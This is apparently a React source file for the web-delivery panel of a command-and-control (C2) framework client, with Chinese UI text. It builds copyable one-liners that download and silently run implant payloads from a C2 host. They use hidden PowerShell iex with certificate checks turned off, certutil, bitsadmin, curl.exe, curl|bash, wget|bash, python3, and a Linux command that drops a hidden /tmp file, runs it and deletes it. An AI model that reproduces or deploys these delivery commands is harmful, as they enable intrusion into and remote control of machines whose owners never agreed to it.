import { useEffect, useMemo, useState } from 'react'
import { useStore } from '../store'
import { AGENT_PROFILES, defaultAgentConfig } from '../api/listeners'
import { copyText } from '../utils'

type Status = {
  script_route?: string
  payload_route?: string
  listener?: string
  agent_name?: string
  format?: string
  arch?: string
  cache_entries?: number
  c2_host_url?: string
  sleep?: string
  jitter?: number
  cache_ttl_min?: number
}

function joinUrl(base: string, route: string) {
  const b = (base || '').replace(/\/+$/, '')
  const r = route.startsWith('/') ? route : `/${route}`
  return `${b}${r}`
}

function defaultC2Host(apiBase: string) {
  if (!apiBase || apiBase.startsWith('/')) {
    return 'https://203.0.113.10:8080/api'
  }
  return apiBase.replace(/\/+$/, '')
}

/** 按监听类型推断默认 agent */
function agentForListenerReg(reg?: string): string {
  const r = String(reg || '')
  if (r.startsWith('Beacon')) return 'beacon'
  if (r.startsWith('Linux')) return 'linux'
  if (r.startsWith('Gopher')) return 'gopher'
  return 'beacon'
}

export function WebDelivery() {
  const listeners = useStore((s) => s.listeners) || {}
  const api = useStore((s) => s.api)
  const pushLog = useStore((s) => s.pushLog)
  const pushToast = useStore((s) => s.pushToast)
  const setTab = useStore((s) => s.setTab)
  const openUiTab = useStore((s) => s.openUiTab)

  const listenerList = useMemo(() => Object.values(listeners), [listeners])

  const [scriptRoute, setScriptRoute] = useState('/deliver')
  const [payloadRoute, setPayloadRoute] = useState('/deliver/payload')
  const [listener, setListener] = useState('')
  const [agentName, setAgentName] = useState('beacon')
  const [format, setFormat] = useState('Exe')
  const [arch, setArch] = useState('') // empty = auto from UA
  const [sleep, setSleep] = useState('5s')
  const [jitter, setJitter] = useState(20)
  const [cacheTtl, setCacheTtl] = useState(30)
  const [c2Host, setC2Host] = useState(() => defaultC2Host(api.baseUrl || ''))
  const [cacheEntries, setCacheEntries] = useState(0)
  const [busy, setBusy] = useState(false)
  const [loaded, setLoaded] = useState(false)
  const [pluginMissing, setPluginMissing] = useState(false)
  const [statusText, setStatusText] = useState('拉取服务端状态…')

  const profile = AGENT_PROFILES.find((p) => p.agent === agentName) || AGENT_PROFILES[0]
  const formats = profile.formats
  const arches = profile.arches

  // 只显示与当前 agent 兼容的监听
  const compatible = useMemo(
    () => listenerList.filter((l) => profile.listeners.includes(l.l_reg_name || '')),
    [listenerList, profile],
  )

  // 选监听时自动对齐 agent（BeaconHTTP → beacon 等）
  function pickListener(name: string) {
    setListener(name)
    const l = listenerList.find((x) => x.l_name === name)
    if (!l) return
    const ag = agentForListenerReg(l.l_reg_name)
    if (ag !== agentName) {
      setAgentName(ag)
      const prof = AGENT_PROFILES.find((p) => p.agent === ag)
      if (prof) {
        // 默认格式：beacon 用 Exe（不是 Stager——投递链要可直接执行）
        if (ag === 'beacon') setFormat('Exe')
        else if (ag === 'gopher') setFormat(prof.formats[0])
        else setFormat(prof.formats.find((f) => f.includes('ELF')) || prof.formats[0])
      }
    }
  }

  useEffect(() => {
    if (!compatible.length) {
      if (listener) setListener('')
      return
    }
    if (!compatible.find((l) => l.l_name === listener)) {
      pickListener(compatible[0].l_name)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [compatible])

  useEffect(() => {
    if (!formats.includes(format)) {
      setFormat(agentName === 'beacon' ? (formats.includes('Exe') ? 'Exe' : formats[0]) : formats[0])
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [agentName])

  async function loadStatus() {
    setBusy(true)
    try {
      const st = await api.webDeliveryStatus()
      setPluginMissing(false)
      applyStatus(st)
      setLoaded(true)
      setStatusText(
        `缓存 ${st.cache_entries ?? 0} 条 · 监听 ${st.listener || '-'} · Agent ${st.agent_name || '-'} · 格式 ${st.format || '-'}`,
      )
    } catch (e: any) {
      const msg = e?.message || String(e)
      if (/404|not found|no route|webdelivery/i.test(msg) || /non-JSON/i.test(msg)) {
        setPluginMissing(true)
        setStatusText('WebDelivery 插件未加载或路由不可用')
      } else {
        setStatusText(`状态拉取失败: ${msg}`)
        pushLog('err', `WebDelivery status: ${msg}`)
      }
    } finally {
      setBusy(false)
    }
  }

  function applyStatus(st: Status) {
    if (st.script_route) setScriptRoute(st.script_route)
    if (st.payload_route) setPayloadRoute(st.payload_route)
    if (st.agent_name) setAgentName(st.agent_name)
    if (st.format) {
      // 兼容服务端历史默认值（已废弃的 Artifact 系列）
      const legacy: Record<string, string> = {
        'Artifact Go Exe': st.agent_name === 'gopher' ? 'Binary EXE' : 'Exe',
        'Artifact C++ Exe': 'Exe',
        'Artifact C++ DLL': 'DLL',
      }
      setFormat(legacy[st.format] || st.format)
    }
    if (st.listener) setListener(st.listener)
    if (st.c2_host_url) setC2Host(st.c2_host_url)
    if (st.sleep) setSleep(st.sleep)
    if (typeof st.jitter === 'number') setJitter(st.jitter)
    if (typeof st.cache_ttl_min === 'number') setCacheTtl(st.cache_ttl_min)
    if (typeof st.arch === 'string') setArch(st.arch || '')
    setCacheEntries(Number(st.cache_entries || 0))
  }

  useEffect(() => {
    loadStatus().catch(() => {})
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  const scriptUrl = useMemo(() => joinUrl(c2Host, scriptRoute), [c2Host, scriptRoute])
  const payloadUrl = useMemo(() => joinUrl(c2Host, payloadRoute), [c2Host, payloadRoute])
  // 方言强制：空 UA 的 WebClient 以前会误返 bash；PS one-liner 走 /deliver?d=ps
  const scriptPs = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=ps`, [scriptUrl])
  const scriptBash = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=bash`, [scriptUrl])

  // —— 产品级多入口 one-liner（参考常见 C2 投递面）——
  // Windows: PS iex / PS IWR / certutil / bitsadmin / curl.exe / mshta(仅提示)
  // *nix: curl|bash / wget|bash / python
  // 服务端 /deliver 按 UA 或 ?d= 返回脚本；/deliver/payload 按 UA 或 ?arch/?os 出对应载荷
  const winCmd = useMemo(
    () =>
      `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('${scriptPs}'))"`,
    [scriptPs],
  )
  const winCmdFromPs = useMemo(
    () =>
      `powershell -nop -w hidden -c '[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString(''${scriptPs}''))'`,
    [scriptPs],
  )
  const winIwr = useMemo(
    () =>
      `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex(iwr -UseBasicParsing '${scriptPs}').Content"`,
    [scriptPs],
  )
  // 直拉 EXE（绕过 script 层；仍走 payload 路由，UA/arch 由服务端判定）
  const winCertutil = useMemo(() => {
    const out = `%TEMP%\\u${Math.random().toString(16).slice(2, 8)}.exe`
    return `cmd /c "certutil -urlcache -split -f ${payloadUrl} ${out} && start /b \"\" ${out}"`
  }, [payloadUrl])
  const winBits = useMemo(() => {
    const out = `%TEMP%\\b${Math.random().toString(16).slice(2, 8)}.exe`
    return `cmd /c "bitsadmin /transfer j /download /priority foreground ${payloadUrl} ${out} & start /b \"\" ${out}"`
  }, [payloadUrl])
  const winCurlExe = useMemo(() => {
    const out = `%TEMP%\\c${Math.random().toString(16).slice(2, 8)}.exe`
    // Win10+ 自带 curl.exe；-k 跳过自签
    return `cmd /c "curl -k -L --http1.1 -o ${out} ${payloadUrl} && start /b \"\" ${out}"`
  }, [payloadUrl])
  const linuxCmd = useMemo(
    () => `curl -skL --http1.1 '${scriptBash}' | bash`,
    [scriptBash],
  )
  const linuxWget = useMemo(
    () => `wget --no-check-certificate -qO- '${scriptBash}' | bash`,
    [scriptBash],
  )
  const linuxPython = useMemo(
    () =>
      `python3 -c "import ssl,urllib.request,os,tempfile,subprocess;ctx=ssl._create_unverified_context();u='${payloadUrl}';p=tempfile.mktemp();open(p,'wb').write(urllib.request.urlopen(u,context=ctx).read());os.chmod(p,0o755);subprocess.Popen([p]);os.unlink(p) if False else None"`,
    [payloadUrl],
  )
  const linuxCurlDirect = useMemo(
    () => `f=/tmp/.$(head -c4 /dev/urandom|xxd -p);curl -skL --http1.1 -o "$f" '${payloadUrl}'&&chmod +x "$f"&&("$f"&);sleep 3;rm -f "$f"`,
    [payloadUrl],
  )

  async function onApply() {
    if (!listener) {
      pushToast('warn', '请先选择监听器')
      return
    }
    if (!scriptRoute.startsWith('/') || !payloadRoute.startsWith('/')) {
      pushToast('warn', '路由必须以 / 开头')
      return
    }
    // 校验监听与 agent 兼容
    const l = listenerList.find((x) => x.l_name === listener)
    if (l && !profile.listeners.includes(l.l_reg_name || '')) {
      pushToast('warn', `监听 ${listener} (${l.l_reg_name}) 与 agent ${agentName} 不兼容`)
      return
    }
    setBusy(true)
    try {
      // 确保默认配置合理（写给 status 展示；真正 build 在插件侧 normalize）
      const _ = defaultAgentConfig(agentName, format, arch || profile.arches[0])
      void _
      await api.webDeliveryConfig({
        script_route: scriptRoute.trim(),
        payload_route: payloadRoute.trim(),
        listener,
        agent_name: agentName,
        format,
        sleep,
        jitter: Number(jitter) || 0,
        cache_ttl_min: Number(cacheTtl) || 0,
        c2_host_url: c2Host.trim(),
        // @ts-expect-error arch optional on older clients; server accepts it
        arch: arch || '',
      } as any)
      pushToast('ok', 'Web Delivery 配置已应用')
      pushLog('ok', `WebDelivery 已同步 listener=${listener} agent=${agentName} format=${format} arch=${arch || 'auto'}`)
      await loadStatus()
    } catch (e: any) {
      const msg = e?.message || String(e)
      pushToast('err', `应用失败: ${msg}`)
      pushLog('err', `WebDelivery config: ${msg}`)
      if (/404|not found|no route/i.test(msg)) setPluginMissing(true)
    } finally {
      setBusy(false)
    }
  }

  async function copy(text: string, label: string) {
    const ok = await copyText(text)
    pushToast(ok ? 'ok' : 'err', ok ? `已复制${label}` : '复制失败')
  }

  const selectedListener = compatible.find((l) => l.l_name === listener) || listenerList.find((l) => l.l_name === listener)

  return (
    <div className="gen-page">
      <div className="gen-layout">
        <div className="gen-main card">
          <div className="card-hd">
            <h3>Web 投递 · 一键上线</h3>
            <span className="spacer" />
            <span className="dim" style={{ fontSize: 12 }}>多 Agent：Beacon / Gopher / Linux</span>
          </div>
          <div className="card-bd gen-body">
            {pluginMissing && (
              <div className="hint warn-hint" style={{ marginBottom: 12 }}>
                服务端未加载 <b>webdelivery</b> 插件（<code>dist/extenders/webdelivery/</code>）。
                确认 profile 已启用该 service，并已编译 so 后从 dist 重启 teamserver。
              </div>
            )}

            <div className="hint muted-hint" style={{ marginBottom: 10 }}>
              按监听自动选 Agent：BeaconHTTP/WS/… → <b>beacon/Exe</b>；GopherTCP → gopher；LinuxTCP → linux。
            </div>

            <div className="gen-section-title">1. 投递路由</div>
            <div className="field-grid-2">
              <div className="field">
                <label>Script 路由</label>
                <input value={scriptRoute} onChange={(e) => setScriptRoute(e.target.value)} placeholder="/deliver" />
              </div>
              <div className="field">
                <label>Payload 路由</label>
                <input value={payloadRoute} onChange={(e) => setPayloadRoute(e.target.value)} placeholder="/deliver/payload" />
              </div>
            </div>
            <div className="field">
              <label>C2 Host URL（目标机访问的 teamserver，含 /api）</label>
              <input
                value={c2Host}
                onChange={(e) => setC2Host(e.target.value)}
                placeholder="https://203.0.113.10:8080/api"
              />
              <div className="dim" style={{ fontSize: 11, marginTop: 4 }}>
                one-liner 拼：<code className="mono">{scriptUrl || '…'}</code>
              </div>
            </div>

            <div className="gen-section-title">2. Agent / 监听器</div>
            <div className="field">
              <label>Agent</label>
              <div className="chip-row">
                {AGENT_PROFILES.map((p) => (
                  <button
                    key={p.agent}
                    type="button"
                    className={agentName === p.agent ? 'primary' : ''}
                    onClick={() => {
                      setAgentName(p.agent)
                      if (p.agent === 'beacon') setFormat('Exe')
                      else if (p.agent === 'gopher') setFormat('Binary EXE')
                      else setFormat(p.formats.find((f) => f.includes('ELF')) || p.formats[0])
                      setArch('')
                    }}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            {compatible.length === 0 ? (
              <div className="hint warn-hint">
                没有兼容监听器（需要 {profile.listeners.join(' / ')}）
                <button className="ghost" style={{ marginLeft: 8 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
                  去创建
                </button>
              </div>
            ) : (
              <div className="gen-listener-list">
                {compatible.map((l) => (
                  <button
                    key={l.l_name}
                    type="button"
                    className={`gen-listener ${listener === l.l_name ? 'active' : ''}`}
                    onClick={() => pickListener(l.l_name)}
                  >
                    <span className={`tag ${String(l.l_status).toLowerCase().includes('listen') ? 'listen' : 'offline'}`}>
                      {l.l_status || '-'}
                    </span>
                    <div className="meta">
                      <div className="name mono">{l.l_name}</div>
                      <div className="sub">{l.l_reg_name || '-'} · {l.l_bind_host || '-'}:{l.l_bind_port || '-'}</div>
                    </div>
                  </button>
                ))}
              </div>
            )}

            <div className="gen-section-title">3. 生成参数</div>
            <div className="gen-params">
              <div className="field">
                <label>格式</label>
                <div className="chip-row">
                  {formats.map((f) => (
                    <button key={f} type="button" className={format === f ? 'primary' : ''} onClick={() => setFormat(f)}>
                      {f}
                    </button>
                  ))}
                </div>
                {agentName === 'beacon' && format === 'Stager' && (
                  <div className="hint muted-hint" style={{ marginTop: 6 }}>
                    Stager：小加载器需再访问 payload 路由拉取。日常一键上线建议用 <b>Exe</b>。
                  </div>
                )}
              </div>
              <div className="field">
                <label>架构（空=按 UA 自动）</label>
                <div className="chip-row">
                  <button type="button" className={!arch ? 'primary' : ''} onClick={() => setArch('')}>自动</button>
                  {arches.map((a) => (
                    <button key={a} type="button" className={arch === a ? 'primary' : ''} onClick={() => setArch(a)}>{a}</button>
                  ))}
                </div>
              </div>
              {(agentName === 'beacon' || agentName === 'gopher' || agentName === 'linux') && (
                <div className="field">
                  <label>{agentName === 'beacon' ? 'Sleep / Jitter' : 'Reconnect timeout / count 相关'}</label>
                  <div style={{ display: 'flex', gap: 8 }}>
                    <input style={{ flex: 1 }} value={sleep} onChange={(e) => setSleep(e.target.value)} placeholder={agentName === 'beacon' ? '5s' : '10'} />
                    {agentName === 'beacon' && (
                      <input
                        type="number"
                        min={0}
                        max={100}
                        style={{ width: 90 }}
                        value={jitter}
                        onChange={(e) => setJitter(Number(e.target.value))}
                        title="抖动%"
                      />
                    )}
                  </div>
                </div>
              )}
              <div className="field">
                <label>缓存 TTL（分钟，0=不缓存）</label>
                <input
                  type="number"
                  min={0}
                  max={1440}
                  value={cacheTtl}
                  onChange={(e) => setCacheTtl(Number(e.target.value))}
                />
              </div>
            </div>

            <div className="btns" style={{ marginTop: 12 }}>
              <button className="primary" style={{ minWidth: 140 }} disabled={busy || !listener} onClick={onApply}>
                {busy ? '同步中…' : '应用并同步'}
              </button>
              <button disabled={busy} onClick={() => loadStatus()}>刷新状态</button>
            </div>

            <div className="hint" style={{ marginTop: 12 }}>
              {statusText}
              {loaded ? ' · 已加载' : ''}
              {cacheEntries ? ` · 缓存 ${cacheEntries}` : ''}
              {selectedListener ? ` · ${selectedListener.l_reg_name}` : ''}
            </div>
          </div>
        </div>

        <aside className="gen-side card">
          <div className="card-hd"><h3>投递入口</h3></div>
          <div className="card-bd" style={{ padding: 14 }}>
            <div className="gen-summary" style={{ marginBottom: 12 }}>
              <div><span className="k">Agent</span><b>{agentName}</b></div>
              <div><span className="k">格式</span><b>{format}</b></div>
              <div><span className="k">架构</span><b className="mono">{arch || 'UA 自动'}</b></div>
              <div><span className="k">监听</span><b className="mono">{listener || '未选'}</b></div>
            </div>

            <div className="hint muted-hint" style={{ marginBottom: 10 }}>
              产品级多入口：目标执行后由服务端按 <b>UA / ?d= / ?arch=</b> 返回对应 OS·架构载荷。
              beacon 仅 Windows；gopher 按 UA 出 Win/Linux/macOS；linux 仅 ELF。
            </div>

            {(agentName === 'beacon' || agentName === 'gopher') && (
              <>
                <div className="gen-section-title" style={{ marginTop: 4 }}>Windows</div>
                <div className="field">
                  <label>PowerShell · cmd / 运行（推荐）</label>
                  <textarea className="wd-cmd mono" readOnly rows={3} value={winCmd} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(winCmd, ' PS/cmd')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>PowerShell · 已在 PS 内（单引号防 $ 展开）</label>
                  <textarea className="wd-cmd mono" readOnly rows={3} value={winCmdFromPs} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(winCmdFromPs, ' PS 内嵌')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>PowerShell · Invoke-WebRequest</label>
                  <textarea className="wd-cmd mono" readOnly rows={3} value={winIwr} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(winIwr, ' IWR')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>certutil 直拉 EXE</label>
                  <textarea className="wd-cmd mono" readOnly rows={2} value={winCertutil} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(winCertutil, ' certutil')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>bitsadmin 直拉 EXE</label>
                  <textarea className="wd-cmd mono" readOnly rows={2} value={winBits} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(winBits, ' bitsadmin')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>curl.exe（Win10+ 自带）</label>
                  <textarea className="wd-cmd mono" readOnly rows={2} value={winCurlExe} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(winCurlExe, ' curl.exe')}>复制</button>
                </div>
              </>
            )}

            {(agentName === 'linux' || agentName === 'gopher') && (
              <>
                <div className="gen-section-title" style={{ marginTop: 14 }}>Linux / macOS / Unix</div>
                <div className="field">
                  <label>curl | bash（推荐）</label>
                  <textarea className="wd-cmd mono" readOnly rows={2} value={linuxCmd} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(linuxCmd, ' curl|bash')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>wget | bash</label>
                  <textarea className="wd-cmd mono" readOnly rows={2} value={linuxWget} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(linuxWget, ' wget|bash')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>curl 直拉二进制</label>
                  <textarea className="wd-cmd mono" readOnly rows={2} value={linuxCurlDirect} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(linuxCurlDirect, ' curl 直拉')}>复制</button>
                </div>
                <div className="field" style={{ marginTop: 8 }}>
                  <label>python3 直拉</label>
                  <textarea className="wd-cmd mono" readOnly rows={3} value={linuxPython} />
                  <button style={{ width: '100%', marginTop: 6 }} onClick={() => copy(linuxPython, ' python3')}>复制</button>
                </div>
              </>
            )}

            {agentName === 'beacon' && (
              <div className="hint muted-hint" style={{ marginTop: 12 }}>
                当前 Agent=beacon → 只展示 Windows 入口。换 gopher/linux 可看 *nix 命令。
                服务端仍按 UA 出 x64/x86；可在左侧固定架构。
              </div>
            )}

            <div className="hint" style={{ marginTop: 12 }}>
              链路：one-liner → <code>/deliver</code>（脚本）→ <code>/deliver/payload</code>（按 UA 架构出包）→ 静默执行。
              直拉类跳过脚本层，直接打 payload。确保 <b>C2 Host</b> 与监听 callback 可达。
            </div>
            <button style={{ width: '100%', marginTop: 10 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
              管理监听器
            </button>
            <button style={{ width: '100%', marginTop: 8 }} onClick={() => { setTab('sessions'); openUiTab('sessions') }}>
              查看主机
            </button>
          </div>
        </aside>
      </div>
    </div>
  )
}
